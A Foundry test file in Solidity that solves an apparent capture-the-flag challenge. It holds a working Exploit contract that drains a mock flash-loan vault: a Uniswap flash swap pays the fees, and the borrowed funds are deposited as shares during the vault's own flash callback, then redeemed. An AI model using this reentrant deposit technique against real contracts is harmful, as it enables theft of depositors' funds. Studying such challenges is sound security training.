// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {FlashLoaner} from "src/flash-loaner/FlashLoaner.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair uniPair; // DAI-USDC trading pair
    IWETH weth;
    Token usdc;
    Token dai;
    FlashLoaner flashLoaner;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=admin; addresses[1]=adminUser;
        amounts[0]=1_000_000e18; amounts[1]=100_000e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses,amounts);

        vm.prank(admin);
        dai = new Token('DAI','DAI');

        vm.prank(admin);
        dai.mint(admin,1_000_000e18);

        // deploying uniswap contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        uniFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        uniRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(uniFactory),address(weth))
            )
        );

        // --adding initial liquidity for DAI-USDC
        vm.prank(admin);
        usdc.approve(address(uniRouter),type(uint).max);
        vm.prank(admin);
        dai.approve(address(uniRouter),type(uint).max);

        vm.prank(admin);
        uniRouter.addLiquidity( // creates pair
            address(usdc),address(dai),
            1_000_000e18,1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        uniPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));

        // deploying core contracts
        vm.prank(admin);
        flashLoaner = new FlashLoaner(address(usdc),'fUSDC','fUSDC');

        // --adminUser deposits funds
        vm.prank(adminUser);
        usdc.approve(address(flashLoaner),type(uint).max);
        vm.prank(adminUser);
        flashLoaner.deposit(100_000e18,adminUser);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        //In this challenge the vulnerability is quite easy
        //We are able to do a flashloan with flashLoaner and deposit the amount for minting share
        //There is no check for reentrant or to be sure that the balance of flashLoaner is not used when deposit() is called
        Exploit exploit = new Exploit(address(flashLoaner), address(usdc),address(uniPair));
        exploit.pwn();
        console.log("balance usdc of attacker : ",usdc.balanceOf(address(attacker)));
        console.log("balance usdc of flashLoaner : ",usdc.balanceOf(address(flashLoaner)));

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains >= 99% of funds
        assertGe(usdc.balanceOf(attacker),99_000e18);
        assertLe(usdc.balanceOf(address(flashLoaner)),1_000e18);

    }

}

contract Exploit {

    FlashLoaner flashLoaner;
    Token usdc;
    IUniswapV2Pair uniPair;
    address private attacker;
    
    constructor(address _target, address _usdc, address _uniPair){
        flashLoaner = FlashLoaner(_target);
        usdc = Token(_usdc);
        uniPair = IUniswapV2Pair(_uniPair);
        attacker = msg.sender;
        usdc.approve(address(flashLoaner),type(uint).max);

    }

    

    //Will be called during flash()
    //We will deposit the amount get from flash() and pass all the check with balanceBefore and balanceAfter
    function flashCallback(uint256 fee, bytes calldata data) external {
        flashLoaner.deposit(100_000e18,address(this));
        usdc.transfer(address(flashLoaner),fee); //Send the fee for the flashloan
    }

    //We are using a flashloan from univ2 in order to pay the fee for using flash() from flashLoaner
    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
        flashLoaner.flash(address(this),usdc.balanceOf(address(flashLoaner))-1,new bytes(0));
        console.log("balance share fusdc of exploit : ",flashLoaner.balanceOf(address(this)));
        flashLoaner.redeem(flashLoaner.balanceOf(address(this)),address(this), address(this));
        console.log("balance share fusdc of exploit : ",flashLoaner.balanceOf(address(this)));
        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
        console.log("amount to repay : ",(amount0Out * 103 /100)+1);//yeah the premium is a bit to high
        usdc.transfer(address(uniPair), (amount0Out * 103 /100)+1);
    }
    
    function pwn() external{
        uniPair.swap(10_000e18,0,address(this), new bytes(1));
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }
}